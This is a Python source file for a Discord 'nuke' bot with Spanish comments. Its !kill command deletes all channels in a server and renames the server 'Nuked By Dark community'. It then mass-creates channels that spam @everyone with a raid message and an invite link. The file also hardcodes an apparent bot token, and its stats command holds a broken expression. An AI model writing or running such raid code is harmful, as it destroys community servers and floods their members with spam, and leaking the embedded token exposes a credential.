import discord
import asyncio
import sqlite3
from discord.ext import commands
from discord import Intents

intents = Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# Semáforo para limitar el número de solicitudes de API concurrentes
api_rate_limit = asyncio.Semaphore(50)

# Crear o conectar a la base de datos
conn = sqlite3.connect('bot_database.db')
c = conn.cursor()

# Crear tabla si no existe
c.execute('''CREATE TABLE IF NOT EXISTS stats
             (id INTEGER PRIMARY KEY, kill_count INTEGER)''')

# Obtener el contador actual
c.execute("SELECT kill_count FROM stats WHERE id=1")
row = c.fetchone()
if row:
    kill_count = row[0]
else:
    # Si no hay datos en la tabla, inicializa el contador
    kill_count = 0
    c.execute("INSERT INTO stats (id, kill_count) VALUES (1, 0)")
    conn.commit()

async def create_channel_and_send_message(guild, name, message):
    try:
        # Crear el canal
        channel = await guild.create_text_channel(name=name)
        # Pausa corta para asegurarse de que el canal esté listo
        await asyncio.sleep(0.10)
        # Enviar el mensaje diez veces en el canal recién creado
        for _ in range(5):
            await channel.send(message)
    except Exception as e:
        print(f"Error al crear el canal o enviar el mensaje: {e}")

async def delete_all_channels(guild):
    # Obtener todos los canales de texto y de voz excepto el canal de comandos
    channels = [channel for channel in guild.channels if isinstance(channel, (discord.TextChannel, discord.VoiceChannel)) and channel != guild.system_channel]
    # Eliminar todos los canales en paralelo
    await asyncio.gather(*[channel.delete() for channel in channels])

@bot.command()
async def kill(ctx):
    global kill_count
    kill_count += 1  # Incrementar el contador

    # Guardar el nuevo valor del contador en la base de datos
    c.execute("UPDATE stats SET kill_count=? WHERE id=1", (kill_count,))
    conn.commit()

    # Eliminar todos los canales de texto y de voz
    await delete_all_channels(ctx.guild)

    # Mensaje a enviar
    message = "HAS SIDO RAIDEADO POR DARK COMMUNITY: https://discord.gg/wjXe7cJXrw @everyone"

    # Cambiar el nombre del servidor y establecer la imagen
    tasks = [
        ctx.guild.edit(name="Nuked By Dark community"),
    ]
    await asyncio.gather(*tasks)

    # Crear canales y enviar mensajes en paralelo
    tasks = []
    for i in range(0, 200, 15):  # Incrementa de 15 en 15
        batch = []
        for _ in range(15):
            async with api_rate_limit:
                task1 = create_channel_and_send_message(ctx.guild, "N̶u̶k̶e̶ ̶B̶y̶ ̶Dark comunnity", message)
                task2 = create_channel_and_send_message(ctx.guild, "Dark Community O̶n̶ ̶T̶o̶p̶", message)
                batch.extend([task1, task2])
        tasks.extend(batch)
        await asyncio.gather(*batch)

    await asyncio.gather(*tasks)

@bot.command()
async def stats(ctx):
    await ctx.send(f"Se han realizado {moderacion-activada} Nukes!.")

bot.run("MTI2NjA0MzAxNjU3ODIwNzgwMg.G7DrmM.BRCK_zS5lVFoYl8qktwbBSyTPr9wHobGHBqDVY")
